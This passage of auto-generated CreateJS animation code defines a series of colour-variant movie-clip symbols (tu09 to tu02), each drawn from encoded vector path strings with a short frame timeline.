	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_3.setTransform(47.6,66.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgcIAnA5");
	this.shape_4.setTransform(25.2,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#7200FF").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhqBijYAAIgTAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgTgcIATAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhqBijXAAIgUAAgAmYEuIgVgdIAfgSIgfASIgVgdIAVAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu09 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QAAhCAthLQAwhVBMgqIgBAaQgDAhgIAhQgdBphPBHQgNAKgPAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgHABQgOAAAAgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#0522D1").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA3AEQALhCAnhDQBPiFCNgFIAHAXQAIAdADAgQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijXAAIgTAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA3AEQALhCAnhDQBPiFCNgFIAHAXQAIAdADAgQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijXAAIgTAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.1);


(lib.tu08 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgbIApA4");
	this.shape_4.setTransform(25.1,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#9C79D1").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9QgKA0g4AyQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgbIAUAbAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9QgKA0g4AyQhrBijZAAIgRAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggATIAggTgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.2);


(lib.tu07 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgKAhQgcBphPBHQgMAKgQAEIgIABQgMAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgbIAoA4");
	this.shape_4.setTransform(25.2,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#61FFAC").s().p("ADTHRInfAAQhaABhggYQi/gvgeh7QgOgsAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkgtBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgTgbIATAbAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRInfAAQhaABhggYQi/gvgeh7QgOgsAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkgtBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmYEuIgVgdIAfgSIgfASIgVgdIAVAdIggATIAggTgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.2);


(lib.tu06 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgdBphPBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgbIAnA4");
	this.shape_4.setTransform(25.2,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.2,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FF7F00").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBSirCigfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAJBkguBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAUAdAAAAAIgeASAgUgbIAUAbAAfgRIgfAR");
	this.shape_7.setTransform(25.2,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBSirCigfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAJBkguBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmYEuIgVgdIAggSIggASIgVgdIAVAdIggATIAggTgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.2);


(lib.tu05 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QAAhCAthLQAwhVBMgqIgBAaQgDAhgIAhQgdBphPBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgbIApA4");
	this.shape_4.setTransform(25.1,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#89FE01").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B+IA3ADQALhCAnhDQBPiFCNgEIAHAXQAIAdADAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgbIAUAbAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B+IA3ADQALhCAnhDQBPiFCNgEIAHAXQAIAdADAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggATIAggTgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.2);


(lib.tu04 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgHABQgOAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAVQgJgKAAgLQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAALgJAKQgIAIgMAAQgLAAgIgIg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#E9342D").s().p("ADTHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA4AEQACgRAIgZQAPgxAYgqQBPiFCNgFIAHAXQAIAdADAgQAIBkgtBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9QgKA0g4AyQhrBijXAAIgTAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B9IA4AEQACgRAIgZQAPgxAYgqQBPiFCNgFIAHAXQAIAdADAgQAIBkgtBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9QgKA0g4AyQhrBijXAAIgTAAgAmYEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu03 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgHABQgOAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAVQgJgKAAgLQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAALgJAKQgIAIgMAAQgLAAgIgIg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#0EBF04").s().p("ADTHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAIBkgtBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9QgKA0g4AyQhrBijXAAIgTAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAIBkgtBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9QgKA0g4AyQhrBijXAAIgTAAgAmYEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu02 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgdBphPBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QAAhCAthLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAVQgJgKAAgLQAAgKAJgJQAIgJALAAQAMAAAIAJQAJAJAAAKQAAALgJAKQgIAIgMAAQgLAAgIgIg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAVQgJgKAAgLQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAALgJAKQgIAIgMAAQgKAAgJgIg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgcIAnA5");
	this.shape_4.setTransform(25.2,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#C69C6D").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBSirCigfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhqBijYAAIgTAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgTgcIATAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBSirCigfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhqBijXAAIgUAAgAmYEuIgVgdIAfgSIgfASIgVgdIAVAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu01 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

